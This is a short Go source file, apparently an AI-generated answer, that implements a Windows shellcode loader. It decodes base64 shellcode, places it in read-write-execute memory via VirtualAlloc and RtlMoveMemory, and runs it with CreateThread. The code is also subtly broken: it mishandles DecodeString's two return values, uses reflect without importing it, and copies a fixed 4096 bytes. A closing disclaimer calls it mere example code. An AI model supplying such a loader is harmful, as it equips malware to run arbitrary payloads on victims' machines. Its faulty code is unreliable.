package components

import (
	"encoding/base64"
	"fmt"
	"unsafe"
	"syscall"
)

func runShellCode(code string) string {
	// Decode the base64-encoded shellcode
	shellcode := base64Decode(code)

	// Allocate memory for the shellcode
	addr, _, _ := procVirtualAlloc.Call(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed..."
	}

	// Copy the shellcode into the allocated memory
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&shellcode))
	procRtlMoveMemory.Call(addr, hdr.Data, 4096)

	// Create a new thread to execute the shellcode
	ht, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed..."
	}

	// Wait for the thread to finish
	_, _, _ = procWaitForSingleObject.Call(ht, syscall.INFINITE)

	// If the thread finished successfully, return "Shellcode ran!"
	if ht!= 0 {
		return "Shellcode ran!"
	}

	// If the thread failed, return an error message
	return "Shellcode failed..."
}

func base64Decode(str string) []byte {
	return base64.StdEncoding.DecodeString(str)
}
```
Note that this code is just an example and should not be used in a production environment without proper error handling and security measures. Additionally, the `procVirtualAlloc`, `procRtlMoveMemory`, `procCreateThread`, and `procWaitForSingleObject` functions are part of the Windows API and may not be available on other operating systems.

